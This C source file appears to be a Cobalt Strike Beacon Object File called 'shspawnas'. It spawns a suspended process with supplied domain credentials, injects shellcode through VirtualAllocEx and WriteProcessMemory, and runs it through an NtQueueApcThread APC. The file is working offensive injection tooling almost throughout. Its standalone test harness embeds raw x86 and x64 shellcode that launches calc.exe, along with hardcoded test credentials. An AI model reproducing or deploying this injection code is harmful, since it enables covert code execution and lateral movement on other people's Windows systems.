#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"
#define SPAWNSIZE 512
#ifdef _WIN64
#define SPAWNASX86 0
#else
#define SPAWNASX86 1
#endif


DWORD shspawnas(const wchar_t * domain, const wchar_t * username, const wchar_t * password ,const wchar_t * appPath, wchar_t * appArgs, const char * shellcode, size_t shellcodelen)
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	DWORD retcode = 0;
	PROCESS_INFORMATION pi = {0};

	// 	internal_printf( "\
	// domain: %S \n \
	// username %S \n \
	// pass %S \n \
	// path %S \n \
	// len: %lu\n", domain, username, password, appPath, shellcodelen
	// );


	STARTUPINFOW si = {sizeof(STARTUPINFOW)};
	retcode = ADVAPI32$CreateProcessWithLogonW(username, domain, password, 0, appPath, appArgs, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi); // Start up in windows incase proc wouldn't have access to current working dir
	if(retcode == 0){
		dwErrorCode = KERNEL32$GetLastError(); 
		goto shspawnas_end;
	}
	void * addr = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, shellcodelen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if(addr == NULL) 
	{
		dwErrorCode = KERNEL32$GetLastError();
		goto shspawnas_end;
	}
	size_t junk = 0;
	if(!KERNEL32$WriteProcessMemory(pi.hProcess, addr, shellcode, shellcodelen, (PSIZE_T) &junk))
	{
		dwErrorCode = KERNEL32$GetLastError();
		BeaconPrintf(CALLBACK_ERROR, "Unable to write payload");
		goto shspawnas_end;
	}
	if(!KERNEL32$VirtualProtectEx(pi.hProcess, addr, shellcodelen, PAGE_EXECUTE_READ, (DWORD *)&junk))
	{
		dwErrorCode = KERNEL32$GetLastError();
		BeaconPrintf(CALLBACK_ERROR, "Unable to make memory executable");
		goto shspawnas_end;
	}
	#ifdef BOF
	NTDLL$NtQueueApcThread(pi.hThread, addr, 0, 0, 0);
	#else
	HMODULE _ntdll = GetModuleHandleA("ntdll.dll");
	NTSTATUS NTAPI(*_NTQ)(HANDLE, PVOID, PVOID, PVOID, ULONG) = (void *)GetProcAddress(_ntdll, "NtQueueApcThread");
	_NTQ(pi.hThread, addr, 0, 0, 0);
	#endif
	KERNEL32$ResumeThread(pi.hThread);

shspawnas_end:
	// Peform any clean-up / freeing of local variables, handles, allocations
	if(pi.hProcess != NULL) {	
		#ifdef BOF
		BeaconCleanupProcess(&pi);
		#else
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		#endif
		}
	return dwErrorCode;
}

#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	datap parser = {0};
	const wchar_t * domain = NULL;
	const wchar_t * username = NULL;
	const wchar_t * password = NULL;
	const char * shellcode = NULL;
	DWORD shellcodelen = 0;
	DWORD ppid = 0;

	char spawnbin[SPAWNSIZE] = {0};
	wchar_t fullcmd[SPAWNSIZE] = {0};
	wchar_t * wspawnbin = NULL; 
	wchar_t * args = NULL;

	
	if(!bofstart())
	{
		return;
	}
	//Parse args
	BeaconDataParse(&parser, Buffer, Length);
	domain = (wchar_t *)BeaconDataExtract(&parser, NULL);
	username = (wchar_t *)BeaconDataExtract(&parser, NULL);
	password = (wchar_t *)BeaconDataExtract(&parser, NULL);
	shellcode = BeaconDataExtract(&parser, (int *)&shellcodelen);


	//get configured spawnto
	BeaconGetSpawnTo(SPAWNASX86, spawnbin, SPAWNSIZE-1 );
	wspawnbin = Utf8ToUtf16(spawnbin);
	MSVCRT$wcscpy(fullcmd, wspawnbin);
	//Parse if we have arguments as well as our function
	args = MSVCRT$wcsstr(wspawnbin, L".exe");
	if(args != NULL) { // found .exe
		args += 4; 
		if(*args != 0) // have something after .exe
		{
			*args = 0; // null term binpath
			args++; // we're pointing at args
		}
		else
		{
			args = NULL;
		}
	}
	internal_printf("Using spawnas binary of %S with arguments of %S\n", wspawnbin, (args == NULL) ? L"NONE" : fullcmd);
	dwErrorCode = shspawnas( domain, username, password, wspawnbin, fullcmd, shellcode, shellcodelen);
	if(ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "shspawnas failed: %lu\n", dwErrorCode);
		goto go_end;
	}

	internal_printf("shspawnas Sucessfully executed.\n");

go_end:

	printoutput(TRUE);
	if(wspawnbin) {intFree(wspawnbin);}
	bofstop();
};
#else
int main(int argc, char ** argv)
{
	//pops calccd C
#ifdef _WIN64
	unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";
#else
unsigned char buf[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
#endif

#ifdef _WIN64
	shspawnas(L"TESTRANGE.LOCAL", L"testuser", L"Password1!", L"C:\\Windows\\system32\\notepad.exe", NULL, (char *)buf, sizeof(buf));
#else
	shspawnas(L"TESTRANGE.LOCAL", L"testuser", L"Password1!", L"C:\\Windows\\syswow64\\notepad.exe", NULL, (char *)buf, sizeof(buf));
#endif

}
#endif